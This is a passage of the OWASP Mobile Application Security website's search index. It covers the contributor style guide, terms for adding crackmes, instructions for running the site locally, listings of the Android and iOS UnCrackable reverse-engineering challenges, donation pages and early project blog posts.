versions","text":"<p>Use the following format when referring to an Android version: Android X (API level YY). Usage of the descriptive name (Ex: Oreo) is discouraged.</p> <p>Ex: Android 9 (API level 28)</p>","tags":[]},{"location":"contributing/5_Style_Guide/#addressing-the-reader-in-test-cases","title":"Addressing the Reader in Test Cases","text":"<p>Throughout the guide, you may want to address the readers in order to tell them what to do, or what they should notice. For any such case, use an active approach and simply address the reader using \"you\".</p> <p>Correct: If you open the AndroidManifest.xml file, you will see a main Application tag, with the following attributes: atr1, atr2 and atr3. If you run the following command, you will see that atr1 is actually dangerous: [...].</p> <p>Wrong: The AndroidManifest.xml file contains an Application tag, with the following attributes: atr1, atr2 and atr3. The command below shows that atr1 is dangerous: [...].</p> <p>Wrong: If we open the AndroidManifest.xml file, we will see a main Application tag, with the following attributes: atr1, atr2 and atr3. If we run the following command, we will see that atr1 is actually dangerous: [...].</p>","tags":[]},{"location":"contributing/5_Style_Guide/#3-external-references","title":"3. External References","text":"","tags":[]},{"location":"contributing/5_Style_Guide/#web-links","title":"Web Links","text":"<p>Use markdown's in-line link format (A) <code>[TEXT](URL \"TITLE\")</code> or (B) <code>[TEXT](URL)</code>.</p> <p>For example:</p> <pre><code>The [threat modeling guidelines defined by OWASP](https://owasp.org/www-community/Threat_Modeling \"OWASP Threat Modeling\") are generally applicable to mobile apps.\n</code></pre> <p>When using (A), be sure to escape special characters such as apostrophe (\\') or single quote (`), as otherwise the link will be broken in Gitbook.</p> <p>Wrong usage, see \"iPhone's\":</p> <pre><code>[UDID of your iOS device via iTunes](https://medium.com/@igor_marques/how-to-find-an-iphones-udid-2d157f1cf2b9 \"How to Find Your iPhone's UDID\")\n</code></pre> <p>Right usage, see \"iPhone\\'s\":</p> <pre><code>[UDID of your iOS device via iTunes](https://medium.com/@igor_marques/how-to-find-an-iphones-udid-2d157f1cf2b9 \"How to Find Your iPhone\\'s UDID\")\n</code></pre> <p>When adding links to the \"References\" section at the end of the chapters use <code>- Title - &lt;url&gt;</code>. This is needed to force latex to print URLs properly for the PDF.</p> <p>For example:</p> <pre><code>- adb - &lt;https://developer.android.com/studio/command-line/adb&gt;\n</code></pre>","tags":[]},{"location":"contributing/5_Style_Guide/#books-and-papers","title":"Books and Papers","text":"<p>For books and papers, use the following format: <code>[#NAME]</code>.</p> <p>And include the full reference in the \"References\" section at the end of the markdown file manually. Example:</p> <pre><code>An obfuscated encryption algorithm can generate its key (or part of the key)\nusing data collected from the environment [#riordan].\n</code></pre> <p>And under the \"References\" section at the end of the chapters:</p> <pre><code>- [#riordan] -  James Riordan, Bruce Schneier. Environmental Key Generation towards Clueless Agents. Mobile Agents and Security, Springer Verlag, 1998\n</code></pre> <p>Papers:</p> <p>The general form for citing technical reports is to place the name and location of the company or institution after the author and title and to give the report number and date at the end of the reference.</p> <p>Basic Format:</p> <pre><code>- [shortname] J. K. Author, \"Title of report,\" Abbrev. Name of Co., City of Co., Abbrev. State, Rep. xxx, year\n\n- [shortname] \\[Author(s)\\], \\[Title\\] - Link\n</code></pre> <p>Books:</p> <pre><code>- [shortname] \\[Author(s)\\], \\[Title\\], \\[Published\\], \\[Year\\]\n\n- [examplebook] J. K. Author, \"Title of chapter in the book,\" in Title of His Published Book, xth ed. City of Publisher, Country if not USA: Abbrev. of Publisher, year, ch. x, sec. x, pp. xxx-xxx.\n</code></pre> <p>NOTE: Use et al. when three or more names are given</p> <p>e.g.</p> <pre><code>- [klaus] B. Klaus and P. Horn, Robot Vision. Cambridge, MA: MIT Press, 1986.\n- [stein] L. Stein, \"Random patterns,\" in Computers and You, J. S. Brake, Ed. New York: Wiley, 1994, pp. 55-70.\n- [myer] R. L. Myer, \"Parametric oscillators and nonlinear materials,\" in Nonlinear Optics, vol. 4, P. G. Harper and B. S. Wherret, Eds. San Francisco, CA: Academic, 1977, pp. 47-160.\n- [abramowitz] M. Abramowitz and I. A. Stegun, Eds., Handbook of Mathematical Functions (Applied Mathematics Series 55). Washington, DC: NBS, 1964, pp. 32-33.\n</code></pre>","tags":[]},{"location":"contributing/5_Style_Guide/#4-references-within-the-guide","title":"4. References Within The Guide","text":"<p>For references to other chapters in the MASTG, simply name the chapter, e.g.: <code>See also the chapter \"Basic Security Testing\"</code>, <code>See the section \"Apktool\" in the chapter \"Basic Security Testing\"</code> etc. The MASTG should be convenient to read as a printed book, so use internal references sparingly. Alternatively you can create a link for the specific section:</p> <pre><code>See the section \"[App Bundles](0x05a-Platform-Overview.md#app-bundles)\" in the chapter ...\n</code></pre> <p>Note that in such a case the anchor (everything after the <code>#</code>) should be lowercase, and spaces should be replaced with hyphens.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#5-insert-pictures","title":"5. Insert Pictures","text":"<p>Pictures must always be an HTML <code>&lt;img</code> element instead of the usual markdown image format.</p> <ul> <li><code>src</code> being the first value.</li> <li>a <code>width</code> may be specified.</li> <li>they must be included in the corresponding directory, e.g. in <code>Document/Images/Chapters</code> for MASTG chapters.</li> </ul> <p>For example:</p> <pre><code>&lt;img src=\"Images/Chapters/0x05b/r2_pd_10.png\" width=\"80%\" /&gt;\n</code></pre>","tags":[]},{"location":"contributing/5_Style_Guide/#6-punctuation-conventions","title":"6. Punctuation Conventions","text":"","tags":[]},{"location":"contributing/5_Style_Guide/#lowercase-or-capital-letter-after-a-colon","title":"Lowercase or Capital Letter after a Colon","text":"<p>Chicago Manual of Style (6.61: Lowercase or capital letter after a colon) says: lowercase the first word unless it is a proper noun or the start of at least two complete sentences or a direct question.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#serial-comma-use","title":"Serial Comma Use","text":"<p>Use a serial comma before \"and\" for the last item in a run-in list of three or more items. For example:</p> <p>We bought apples, oranges, and tomatoes from the store.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#quote-marks-and-apostrophes","title":"Quote Marks and Apostrophes","text":"<p>Use straight double quotes, straight single quotes, and straight apostrophes (not curly quotes/apostrophes).</p>","tags":[]},{"location":"contributing/5_Style_Guide/#technical-terms","title":"Technical Terms","text":"<p>Spell/punctuate specific technical terms as they are used by the company (e.g., use the company website).</p> <p>In order of preference, spell/punctuate generic technical terms according to</p> <ol> <li>Merriam Webster's Collegiate Dictionary, 11th edition.</li> <li>Microsoft Manual of Style, 4th edition</li> <li>foldoc.org (Free Online Dictionary of Computing)</li> </ol> Noun Form Adjectival Form App Store NA backend backend Base64 Base64- black box same Bundle ID NA bytecode NA client side client-side codebase same code signing same command line same disassembler NA end users NA file name same macOS NA OS X NA pentest same PhoneGap NA Python NA repackage NA runtime same server side server-side snapshot length NA use case same Wi-Fi same white box same","tags":[]},{"location":"contributing/5_Style_Guide/#7-comments","title":"7. Comments","text":"<p>Markdown blockquotes can be used for comments in the documents by using <code>&gt;</code></p> <pre><code>&gt; This is a blockquote\n</code></pre>","tags":[]},{"location":"contributing/5_Style_Guide/#8-code-and-shell-commands","title":"8. Code and Shell Commands","text":"<p>Use code blocks when including sample code, shell commands, and paths. In Markdown, code blocks are denoted by triple backticks (<code>```</code>). GitHub also supports syntax highlighting for a variety of languages. For example, a Java code block should be annotated as follows:</p> <pre><code>```java\npublic static void main(String[] args) { System.out.println(\" Hello World!\"); } } ;\n```\n</code></pre> <p>This produces the following result:</p> <pre><code>public static void main(String[] args) { System.out.println(\" Hello World!\"); } }\n</code></pre> <p>When including shell commands, make sure to use the correct language for syntax highlighting (e.g. <code>shell</code> or <code>bash</code>) and remove any prompt (host name, username, ...) from the commands, e.g.:</p> <pre><code>```shell\necho 'Hello World'\nHello World\n```\n</code></pre> <p>When a command requires parameters that need to be modified by the reader, surround them with angle brackets:</p> <pre><code>adb pull &lt;remote_file&gt; &lt;target_destination&gt;\n</code></pre>","tags":[]},{"location":"contributing/5_Style_Guide/#in-text-keywords","title":"In-text Keywords","text":"<p>When they do not occur in a code block, place the following code-related keywords in backticks (<code>``</code>), double straight quote marks (<code>\"\"</code>), or leave unpunctuated according to the table:</p> Backticks Quotation Marks No Punctuation function names section titles application name method names chapter titles folder names commands book titles memory addresses (e.g. 0x100044520) class names flags values (e.g., \"true\", lowercase) block names command options (e.g., \"help\" option) flag names single menu item (e.g., \"Home\" menu) file names system error msgs. package names file paths passwords port numbers binary names method/function arguments method/function argument or return values (e.g., <code>true</code>, <code>0</code>, <code>YES</code>) XML attributes (e.g., <code>get-task-allow</code> on iOS Plists, <code>\"@string/app_name\"</code> on Android Manifests) XML attribute values (e.g., <code>android:label</code> on Android Manifests) property names object names API calls interface names <p>If nouns in backticks are plural, place the \"s\" after the second backtick (e.g. <code>RuntimeException</code>s). Do not add parentheses, brackets, or other punctuation to any keywords that are in backticks (e.g., <code>main</code> not <code>main()</code>).</p>","tags":[]},{"location":"contributing/5_Style_Guide/#navigation","title":"Navigation","text":"<p>When referring to any UI element by name, put its name in boldface, using <code>**&lt;name&gt;**</code> (e.g., Home -&gt; Menu).</p>","tags":[]},{"location":"contributing/6_Add_a_Crackme/","title":"Add a Crackme","text":"<p>The MAS project is a powerful learning resource and the MAS Crackmes are no exception. They allow the MAS community not only to practice the MAS skills they've learned from the MASTG but also let them confirm their approaches to the used techniques, especially when performing reverse engineering.</p>","tags":[]},{"location":"contributing/6_Add_a_Crackme/#who-can-contribute-with-a-crackme","title":"Who Can Contribute with a Crackme?","text":"<p>Anyone from individuals to companies. You only have to read and accepts the Terms and Conditions listed below.</p> <p>Before submitting a crackme, first of all contact the MAS team here: https://mas.owasp.org/contact/</p>","tags":[]},{"location":"contributing/6_Add_a_Crackme/#terms-and-conditions","title":"Terms and Conditions","text":"<p>If you want to contribute to the MAS crackmes please consider that:</p> <p>\u2611\ufe0f The source code of the crackme apps must be made publicly available at https://github.com/OWASP/mas-crackmes.</p> <p>\u2611\ufe0f The crackme apps must be reviewed and approved by the MAS project leaders. Some form of documentation and solution writeup/video must be provided for the review process. That must include a list of \"features\" including techniques used (e.g. obfuscation, whitebox crypto, inline assembly, etc.)</p> <p>\u2611\ufe0f The crackme apps must not contain any company branding or advertising material (ads, company URL, etc.).</p> <p>\u2611\ufe0f The crackme apps must align with the MASVS and MASTG in some way.</p> <p>\u2611\ufe0f The crackme authors are fully responsible for the maintenance of the crackme in the case bugfixes or updates are needed and the MAS team is not able to perform those actions.</p>","tags":[]},{"location":"contributing/6_Add_a_Crackme/#publishing-and-acknowledgements","title":"Publishing and Acknowledgements","text":"<p>When successfully adding a crackme, its authors will be credited in the corresponding crackme page in the project website at https://mas.owasp.org/crackmes and an announcement will be made via the official MAS social media channels.</p>","tags":[]},{"location":"contributing/6_Add_a_Crackme/#owasp-openness-and-licencing-guidelines","title":"OWASP Openness and Licencing Guidelines","text":"<p>The OWASP projects have a strong foundation in openness and this includes all material related to the projects.</p> <p>OWASP Projects must be open in all facets, including source material, contributors, organizational structure, and finances (if any). Project source code (if applicable) must be made openly available, project communication channels (e.g. mailing lists, forums) should be open and free from censorship, and all project materials must be licensed under a community friendly license as approved by the Free Software Foundation (Appendix 8.2).</p> <p>Please refer to the OWASP Project Leader Handbook that we as project leaders need to comply with: https://github.com/OWASP-Foundation/Project-Handbook</p>","tags":[]},{"location":"contributing/7_Run_the_Website/","title":"How to Run the OWASP MAS Website Locally","text":"<p>This guide will help you set up and run the OWASP MAS website locally on your machine. Follow the steps below to get started.</p>","tags":[]},{"location":"contributing/7_Run_the_Website/#using-docker","title":"Using Docker","text":"<p>The easiest way to run the website is by using Docker:</p> <pre><code>git clone https://github.com/OWASP/mastg.git\ncd mastg\ndocker build . -t mastg\ndocker run --name mastg -it --rm -p 8000:8000 -u $(id -u):$(id -g) -v $(pwd):/workspaces/mastg mastg\n</code></pre> <p>This will make the website available on <code>http://localhost:8000</code>. By default, interactions with the Github api are disabled, which means some dynamically retrieved content will not be available. If you want to enable the Github API, create a personal access token and export it as an environment variable. Make sure docker can access the token by using <code>-e GITHUB_TOKEN</code>:</p> <pre><code>export GITHUB_TOKEN=&lt;TOKEN&gt;\ndocker run --name mastg -it --rm -p 8000:8000 -u $(id -u):$(id -g) -e GITHUB_TOKEN -v $(pwd):/workspaces/mastg mastg\n</code></pre>","tags":[]},{"location":"contributing/7_Run_the_Website/#without-docker","title":"Without Docker","text":"<p>TLDR for advanced users:</p> <ul> <li>Clone the MASTG, MASVS and MASWE repos</li> <li>Set up a virtual environment</li> <li>Install dependencies from <code>src/scripts/requirements.txt</code></li> <li>Add your token as an environment variable: <code>export GITHUB_TOKEN=&lt;TOKEN&gt;</code></li> <li>Run the website using <code>./run_web.sh</code></li> </ul>","tags":[]},{"location":"contributing/7_Run_the_Website/#prerequisites","title":"Prerequisites","text":"<p>Before running the website, ensure you have the following installed on your system:</p> <ul> <li>Python 3.8 or higher</li> <li>pip (Python package manager)</li> <li>Git</li> <li>Visual Studio Code (vscode)</li> </ul> <p>Create a personal access token on Github and export this token as environment variable (e.g. in your .zshrc file):</p> <pre><code>export GITHUB_TOKEN=&lt;TOKEN&gt;\n</code></pre> <p>Alternatively, you can add your token inside of the <code>run_web.sh</code> script. Open the script in a code editor for more information.</p>","tags":[]},{"location":"contributing/7_Run_the_Website/#step-1-clone-the-owasp-mas-repositories","title":"Step 1: Clone the OWASP MAS Repositories","text":"<p>Run the following commands in your terminal:</p> <pre><code>git clone https://github.com/OWASP/mastg.git\ngit clone https://github.com/OWASP/masvs.git\ngit clone https://github.com/OWASP/maswe.git\n</code></pre> <p>Note: We'll just work with the <code>OWASP/mastg</code> repo, but the <code>OWASP/masvs</code> and <code>OWASP/maswe</code> are required for the website to run.</p>","tags":[]},{"location":"contributing/7_Run_the_Website/#step-2-open-the-owasp-mastg-repository-in-vscode","title":"Step 2: Open the OWASP MASTG Repository in vscode","text":"<p>Run the following commands in your terminal:</p> <pre><code>cd mastg\ncode .\n</code></pre>","tags":[]},{"location":"contributing/7_Run_the_Website/#step-3-install-python-dependencies","title":"Step 3: Install Python Dependencies","text":"<p>It is highly recommended to use a virtual environment (venv) to manage dependencies and avoid conflicts with other Python projects.</p> <p>Use vscode's <code>Command Palette</code> (Press <code>\u2318+Shift+P</code> on macOS or <code>Ctrl+Shift+P</code> on Windows/Linux)</p> <ol> <li>Create a venv:<ul> <li>Press <code>\u2318+Shift+P</code> -&gt; <code>Python: Create Environment</code></li> <li>Select <code>\"Quick Create\"</code></li> </ul> </li> <li>Select the venv as the Python interpreter:<ul> <li>Press <code>\u2318+Shift+P</code> -&gt; <code>Python: Select Interpreter</code></li> <li>Choose the venv you just created.</li> </ul> </li> <li>Install the dependencies</li> <li>Press <code>\u2318+j</code> to open the terminal</li> <li>Run <code>pip install -r src/scripts/requirements.txt</code></li> </ol>","tags":[]},{"location":"contributing/7_Run_the_Website/#step-4-run-the-website","title":"Step 4: Run the Website","text":"<p>Run the following command in the terminal:</p> <pre><code>./run_web.sh\n</code></pre> <p>The script simply runs <code>mkdocs serve</code> with some additional arguments. Open the script in a code editor for more information.</p> <p>Access the website at http://localhost:8000.</p>","tags":[]},{"location":"contributing/7_Run_the_Website/#step-5-debugging-the-website","title":"Step 5: Debugging the Website","text":"<p>To debug the website:</p> <ul> <li>Go to <code>Run and Debug</code> in vscode (or press <code>\u2318+Shift+D</code> on macOS)</li> <li>Select <code>Python: MkDocs Serve</code></li> <li>Click the green play button to start debugging</li> <li>Set breakpoints in the code as needed</li> </ul>","tags":[]},{"location":"crackmes/","title":"MAS Crackmes","text":"<p>Welcome to the MAS Crackmes aka. UnCrackable Apps, a collection of mobile reverse engineering challenges. These challenges are used as examples throughout the OWASP MASTG. Of course, you can also solve them for fun.</p> Android UnCrackable L1 UnCrackable-Level1.apk Download Android UnCrackable L2 UnCrackable-Level2.apk Download Android UnCrackable L3 UnCrackable-Level3.apk Download Android UnCrackable L4 r2pay-v0.9.apk Download Android UnCrackable DRM validate (ELF 32-bit) Download iOS UnCrackable L1 UnCrackable-Level1.ipa Download iOS UnCrackable L2 UnCrackable-Level2.ipa Download <p></p>","tags":[]},{"location":"crackmes/Android/","title":"Android Crackmes","text":"","tags":[]},{"location":"crackmes/Android/#android-uncrackable-l1","title":"Android UnCrackable L1","text":"<p>A secret string is hidden somewhere in this app. Find a way to extract it.</p> <p>Download</p> Installation <p>This app is compatible with Android 4.4 and up.</p> <pre><code>$ adb install UnCrackable-Level1.apk\n</code></pre> SPOILER (Solutions) <ul> <li>Solution using Frida by c0dmtr1x</li> <li>Solution using static analysis</li> <li>Solution using jdb</li> <li>Solution using Frida by Eduardo Novella</li> <li>Solution using Xposed by sh3llc0d3r</li> <li>Solution using RMS by @mobilesecurity_ (video)</li> <li>Solution using static analysis by Eduardo Vasconcelos</li> <li>Solution using Frida by Davide Cioccia</li> <li>Solution using MobSF by Jitendra Patro</li> </ul> <p> By Bernhard Mueller </p>","tags":[]},{"location":"crackmes/Android/#android-uncrackable-l2","title":"Android UnCrackable L2","text":"<p>This app holds a secret inside. May include traces of native code.</p> <p>Download</p> Installation <p>This app is compatible with Android 4.4 and up.</p> <pre><code>$ adb install UnCrackable-Level2.apk\n</code></pre> SPOILER (Solutions) <ul> <li>Solution using Frida and radare2 by c0dmtr1x.</li> <li>Solution using Frida by Eduardo Novella.</li> <li>Solution using patches by sh3llc0d3r.</li> <li>Solution using RMS by @mobilesecurity_ (video).</li> <li>Solution using static analysis and Ghidra by Eduardo Vasconcelos.</li> <li>Solution using Ghidra and Frida by Davide Cioccia</li> </ul> <p> By Bernhard Mueller. Special thanks to Michael Helwig for finding and fixing an oversight in the anti-tampering mechanism. </p>","tags":[]},{"location":"crackmes/Android/#android-uncrackable-l3","title":"Android UnCrackable L3","text":"<p>The crackme from hell! A secret string is hidden somewhere in this app. Find a way to extract it.</p> <p>Download</p> Installation <p>This app is compatible with Android 4.4 and up.</p> <pre><code>$ adb install UnCrackable-Level3.apk\n</code></pre> SPOILER (Solutions) <ul> <li>Solution using Frida by Eduardo Novella.</li> <li>Solution using patches by sh3llc0d3r.</li> <li>Solution using Ghidra and Frida by Davide Cioccia</li> </ul> <p> By Bernhard Mueller. Special thanks to Eduardo Novella for testing, feedback and pointing out flaws in the initial build(s). </p>","tags":[]},{"location":"crackmes/Android/#android-uncrackable-l4","title":"Android UnCrackable L4","text":"<p>The Radare2 community always dreamed with its decentralized and free currency to allow r2 fans to make payments in places and transfer money between r2 users. A debug version of the r2Pay app has been developed and it will be supported very soon in many stores and websites. Can you verify that this is cryptographically unbreakable?</p> <p>Hint: Run the APK in a non-tampered device to play a bit with the app.</p> <ol> <li>There is a master PIN code that generates green tokens (aka r2coins) on the screen. If you see a red r2coin, then this token won't be validated by the community. You need to find out the 4 digits PIN code and the salt employed as well. Flag: <code>r2con{PIN_NUMERIC:SALT_LOWERCASE}</code></li> <li>There is a \"r2pay master key\" buried in layers of obfuscation and protections. Can you break the whitebox? Flag: <code>r2con{ascii(key)}</code></li> </ol> <p>Versions:</p> <p>Download v0.9</p> <p>Download v1.0</p> <ul> <li><code>v0.9</code> - Release for OWASP MAS: Source code is available and the compilation has been softened in many ways to make the challenge easier and more enjoyable for newcomers.</li> <li><code>v1.0</code> - Release for R2con CTF 2020: No source code is available and many extra protections are in place.</li> </ul> Installation <p>This app is compatible with Android 4.4 and up.</p> <pre><code>$ adb install r2pay-v0.9.apk\n</code></pre> SPOILER (Solutions) <ul> <li>Solution bypassing protections using Frida/QBDI by Romain Thomas (v1.0).</li> <li>Solution whitebox key recovery using SCAMarvels by Romain Thomas (v1.0).</li> </ul> <p> Created and maintained by Eduardo Novella &amp; Gautam Arvind. Special thanks to NowSecure for supporting this crackme. </p>","tags":[]},{"location":"crackmes/Android/#android-license-validator","title":"Android License Validator","text":"<p>A brand new Android app sparks your interest. Of course, you are planning to purchase a license for the app eventually, but you'd still appreciate a test run before shelling out $1. Unfortunately no keygen is available! Generate a valid serial key that is accepted by this app.</p> <p>Download</p> Installation <p>Copy the binary to your Android device and run using the shell.</p> <pre><code>$ adb push validate /data/local/tmp\n[100%] /data/local/tmp/validate\n$ adb shell chmod 755 /data/local/tmp/validate\n$ adb shell /data/local/tmp/validate\nUsage: ./validate &lt;serial&gt;\n$ adb shell /data/local/tmp/validate 1234\nIncorrect serial (wrong format).\n$ adb shell /data/local/tmp/validate JACE6ACIARNAAIIA\nEntering base32_decode\nOutlen = 10\nEntering check_license\nProduct activation passed. Congratulations!\n</code></pre> SPOILER (Solutions) <ul> <li>Solution using symbolic execution by Bernhard Mueller.</li> </ul> <p> By Bernhard Mueller </p>","tags":[]},{"location":"crackmes/Android/#mastg-hacking-playground","title":"MASTG Hacking Playground","text":"<p>Did you enjoy working with the Crackmes? There is more! Go to the MASTG Hacking Playground and find out!</p> <p></p>","tags":[]},{"location":"crackmes/iOS/","title":"iOS Crackmes","text":"","tags":[]},{"location":"crackmes/iOS/#ios-uncrackable-l1","title":"iOS UnCrackable L1","text":"<p>A secret string is hidden somewhere in this binary. Find a way to extract it. The app will give you a hint when started.</p> <p>Download</p> Installation <p>Open the \"Device\" window in Xcode and drag the IPA file into the list below \"Installed Apps\".</p> <p>Note: The IPA is signed with an Enterprise distribution certificate. You'll need to install the provisioning profile and trust the developer to run the app the \"normal\" way. Alternatively, re-sign the app with your own certificate, or run it on a jailbroken device (you'll want to do one of those anyway to crack it).</p> SPOILER (Solutions) <ul> <li>Multiple solutions by David Weinstein.</li> <li>Solution by Ryan Teoh.</li> <li>Solution with Angr by Vikas Gupta.</li> <li>Solution by Pietro Oliva.</li> </ul> <p> By Bernhard Mueller </p>","tags":[]},{"location":"crackmes/iOS/#ios-uncrackable-l2","title":"iOS UnCrackable L2","text":"<p>This app holds a secret inside - and this time it won't be tampered with!</p> <p>Hint: it is related to alcoholic beverages.</p> <p>Download</p> Installation <p>Open the \"Device\" window in Xcode and drag the IPA file into the list below \"Installed Apps\".</p> <p>Note 1: The IPA is signed with an Enterprise distribution certificate. You'll need to install the provisioning profile and trust the developer to run the app the \"normal\" way. Alternatively, re-sign the app with your own certificate, or run it on a jailbroken device (you'll want to do one of those anyway to crack it).</p> <p>Note 2: Due to its anti-tampering mechanisms the app won't run correctly if the main executable is modified and/or re-signed.</p> SPOILER (Solutions) <ul> <li>Solution by Ryan Teoh.</li> <li>Solution by Pietro Oliva.</li> </ul> <p> By Bernhard Mueller </p> <p></p>","tags":[]},{"location":"donate/how_to_donate/","title":"How to Donate","text":"<p>1. Make your Donation:</p> <p></p> <p>Click the button to make your donation directly in the official OWASP website:</p> <p> Fill in the form and be sure to select the option \"Publicly list me as a supporter of OWASP Mobile Application Security\"</p> <p> Make your Donation</p> <p></p> <p>2. Register your Donation Package (optional):</p> <p></p> <p>If your donation is above USD 500 you may opt-in for a Donation Package by registering it. We will then, together with the OWASP Foundation, verify and process it.</p> <p> Register your Donation</p> <p></p>","tags":[]},{"location":"donate/packages/","title":"Donation Packages","text":"<p>These types of public recognition shall be online no less than one year, or no less than the next major release, whichever is greater.</p> <p> The Donation Packages have a maximum duration, once expired the logos will be removed and the donator will still be listed as supporter on the project website, GitHub and in the printed and digital versions. This can be renewed anytime.</p>  Good Samaritan (USD 500)  Honorable Benefactor (USD 2,000 / 8 Available)  God Mode Donator (USD 4,000 / 5 Available) <ul><li> Listed as a supporter.</li><li> Small company logo.</li><li> 1 year</li></ul> <ul><li> Listed as a supporter.</li><li> Medium company logo</li><li> 2 year</li></ul> <ul><li> Listed as a supporter.</li><li>Large company logo.</li><li> 3 years</li></ul> <p>Please note that the OWASP Donation Policy has changed since 22-Sept-2020. All details can be found in OWASP Donations Policy page.</p> <p>Contact us if you have any questions regarding your donation.</p>","tags":[]},{"location":"news/","title":"Blog","text":"","tags":[]},{"location":"news/2016/12/04/call-for-authors-the-ultimate-open-source-mobile-app-reverse-engineering-guide/","title":"Call For Authors: The Ultimate Open-Source Mobile App Reverse Engineering Guide","text":"<p>Reverse engineering is an art, and describing every available facet of it would fill a whole library. The sheer range techniques and possible specializations is mind-blowing: One can spend years working on a very specific, isolated sub-problem, such as automating malware analysis or developing novel de-obfuscation methods. For mobile app security testers, it can be challenging to filter through the vast amount of information and build a working methodology. Things become even more problematic when one is tasked to assess apps that are heavily obfuscated and have anti-tampering measures built in.</p> <p>One of the main goals in the MSTG is to build the ultimate resource for mobile reverse engineers. This includes not only basic static and dynamic analysis, but also advanced de-obfuscation, scripting and automation. Obviously, writing all this content is a lot of work, both in terms of general content and OS-specific how-tos. We're therefore looking for talented authors that want to join the project early on. Topics include the following:</p> <ul> <li>Basic Hybrid Static/Dynamic Analysis</li> <li>Code Injection and Dynamic Instrumentation (Substrate, FRIDA)</li> <li>Dynamic Binary Instrumentation (Valgrind, PIE)</li> <li>Analysis Frameworks (Metasm / Miasm)</li> <li>Symbolic Execution</li> <li>DCA and DPA attacks on white-box crypto</li> <li>Dynamic analysis frameworks (PANDA / DroidScope,...)</li> <li>Anything else we might have missed</li> </ul>","tags":[]},{"location":"news/2016/12/04/call-for-authors-the-ultimate-open-source-mobile-app-reverse-engineering-guide/#what-is-in-for-me","title":"What is in for me?","text":"<p>All of this is unpaid, volunteer work. However, depending on your contribution, you will be named in the \"lead authors\" or \"contributors\" list, and you'll be able to point to the fact that you co-authored the guide. You'll also be contributing to the field, helping others who are just starting out, and in turn becoming a happier person yourself (reaping the full benefits of your altruism).</p>","tags":[]},{"location":"news/2016/12/04/call-for-authors-the-ultimate-open-source-mobile-app-reverse-engineering-guide/#where-do-i-sign-up","title":"Where do I sign up?","text":"<p>First of all, have a look at the existing RE chapters outline. You'll probably immediately have ideas on how you can contribute. If that's the case, read the Contribution Guide first.</p> <p>Then contact Bernhard Mueller - ideally directly on the OWASP Mobile Security Project Slack Channel, where you'll find all the other project members. You can sign up for an account here.</p>","tags":[]},{"location":"news/2017/01/22/mobile-testing-guide-toc-available/","title":"Mobile Testing Guide TOC Available","text":"<p>As of now, we'll be auto-generating a table of contents out of the current MSTG master branch. This reflects the current state of the guide, and should make it easier to coordinate work between authors. A short-term goal is to finalize the structure of the guide so we get a clearer picture of what will be included in the final document. Lead authors are encouraged to complete the outline of their respective chapters.</p> <p>On another note, we still need additional authors to help with all sections of the guide, including mobile operating system overviews, testing processes and techniques, and reverse engineering. Especially iOS authors are in short supply! As usual, ping us on the Slack Channel if you want to contribute.</p>","tags":[]},{"location":"news/2017/01/28/mobile-crackmes-and-reversing-tutorials/","title":"Mobile Crackmes and Reversing Tutorials","text":"<p>A key goal of the OWASP Mobile Testing Project is to build the ultimate learning resource and reference guide for mobile app reversers. As hands-on hacking is by far the best way to learn, we'd like to link most of the content to practical examples.</p> <p>Starting now, we'll be adding crackmes for Android and iOS to the GitHub repo that will then be used as examples throughout the guide. The goal is to collect enough resources for demonstrating the most important tools and techniques in our guide, plus additional crackmes for practicing.</p> <p>For starters there are three challenges:</p> <ul> <li>Android License Validator</li> <li>Uncrackable App for iOS Level 1</li> <li>Uncrackable App for iOS Level 2</li> </ul> <p>One of these three already has a documented solution in the guide. Tutorials for solving the other two still need to be added.</p>","tags":[]},{"location":"news/2017/01/28/mobile-crackmes-and-reversing-tutorials/#we-need-more-authors-and-contributors","title":"We Need More Authors and Contributors!","text":"<p>Maybe you have noticed that the reverse engineering sections in the Mobile Testing Guide are incomplete. The reason: We're still in the starting stages and don't have a lot of authors and contributors (in fact, 99% of the reversing content was produced by one guy). We'd love to welcome you as a contributor of crackmes, tutorials, writeups, or simply new ideas for this project.</p>","tags":[]},{"location":"news/2017/01/28/mobile-crackmes-and-reversing-tutorials/#what-you-can-do","title":"What You Can Do","text":"<p>The OWASP MSTG is an open project and there's a lot of flexibility - it mostly depends on your skill set and willingness to commit your time. That said, the some areas that need help are:</p> <ul> <li>Solving crackmes and contributing a tutorial to the guide (preferable a technique that's not already documented).</li> <li>Writing and adding new crackmes along with solutions (should also describe something not already in the guide. Cracking white-boxes, dynamic analysis using an emulator / introspection, etc. etc.).</li> <li>General reversing write-ups to describe specific processes and techniques</li> <li> <p>Help us figure out resiliency testing processes and obfuscation metrics The reversing part of the guide consists of the following chapters:</p> </li> <li> <p>Tampering and Reverse Engineering - General Overview</p> </li> <li>Tampering and Reverse Engineering on Android</li> <li>Tampering and Reverse Engineering on iOS</li> </ul>","tags":[]},{"location":"news/2017/01/28/mobile-crackmes-and-reversing-tutorials/#how-to-join","title":"How To Join","text":"<p>Read the Contribution Guide first, and join the OWASP Mobile Security Project Slack Channel, where you'll find all the other project members.</p>","tags":[]},{"location":"news/2017/01/31/mobile-app-security-verification-standard-v092-available-for-download/","title":"Mobile App Security Verification Standard v0.9.2 Available For Download","text":"<p>The Mobile App Security Verification Standard (MASVS) has undergone a major revision, including a re-design of the security model and verification levels. We also revised many security requirements to address the multitude of issues raised on GitHub. The result is MASVS v0.9.2, which is now available for download in PDF format.</p> <p>As the MASVS is nearing maturity, we have decided to freeze the requirements until the Mobile Testing Guide and checklists \"catch up\" (due to the one-to-one mapping between requirements in the MASVS and MSTG, changes to the requirements make it necessary to update the other documents as well, causing repeated effort). Unless major issues pop up, the current list will therefore remain in place until MASVS/MSTG v1.0, and further changes will be reserved for v1.1 or later releases.</p> <p>The MASVS is a community effort to establish security requirements for designing, developing and testing secure mobile apps on iOS and Android. Join the OWASP Mobile Security Project Slack Channel to meet the project members! You can sign up for an account here.</p>","tags":[]},{"location":"news/2017/04/05/mobile-app-security-verification-standard-update/","title":"Mobile App Security Verification Standard Update","text":"<p>Version 0.9.3 of the MASVS is now available for download. This release contains several bug fixes and modifications to security requirements:</p> <ul> <li>Merged requirements 7.8 and 7.9 into for simplification</li> <li>Removed Anti-RE controls 8.1 and 8.2</li> <li>Updated MSTG links to current master</li> <li>Section \"Environmental Interaction\" renamed to \"Platform Interaction\"</li> <li>Removed To-dos</li> <li>Fixed some wording &amp; spelling issues</li> 